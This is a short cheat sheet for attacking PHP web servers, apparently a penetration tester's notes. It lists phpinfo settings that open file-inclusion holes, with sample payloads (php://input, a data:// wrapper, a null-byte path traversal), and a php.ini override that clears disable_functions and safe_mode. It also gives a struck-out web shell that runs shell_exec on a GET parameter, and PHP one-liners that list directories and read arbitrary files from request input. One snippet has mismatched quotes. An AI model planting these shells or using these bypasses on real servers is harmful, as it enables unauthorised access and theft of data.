
###phpinfo.php
+ **allow_url_fopen=On & allow_url_include=On** Allow RFI
+ **allow_url_include=On** Allow `?file=php://input` and `?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`
+ **magic_quotes_gpc=Off** Allow `?file=../../../../../../../../../var/www/accounts/%00`
+ **disable_functions** Check for *system*, *eval*, *shell_exec*, *passthru*, *popen*, *proc_open*, *escapeshellarg*, *escapeshellcmd*, *exec*, *proc_close*, *proc_get_status*, *proc_nice*, *proc_terminate*, *pcntl_exec*, *unserialize*
+ **open_basedir** Deepest directory level which can be accessed

###Override php.ini settings
####Method 1
Create an empty `php.ini` file on the directory were the desired php files reside.    
Or a `php.ini` file with these contents:
```
disable_functions = hack,the,planet
magic_quotes_gpc = off
safe_mode = off
suhosin.executor.func.blacklist = hack,the,planet
```

~~####Method 2~~
~~Use *ini_set()*~~    
~~```PHP~~
~~error_reporting(E_ALL);~~
~~ini_set("display_errors", 1);~~
~~ini_set("disable_functions", 0);~~
~~echo(shell_exec($_GET['c']));~~
~~```~~
~~http://php.net/manual/en/function.ini-set.php~~

###Vulnerable functions
####*unserialize()/serialize()*
https://www.owasp.org/index.php/PHP_Object_Injection

###SuPHP
It allows php scripts to be executed with the permissions of their owners    
####Interesting files
`/etc/suphp/suphp.conf`

###Snippets
####List files in directory
`<?php echo '<pre>'; print_r(scandir($_REQUEST['dir'])); echo '</pre>'; ?>`

####Open file
`<?php $file = fopen($_REQUEST['file’],’r'); while(! feof($file)) { echo fgets($file). '<br />'; } fclose($file); ?>`
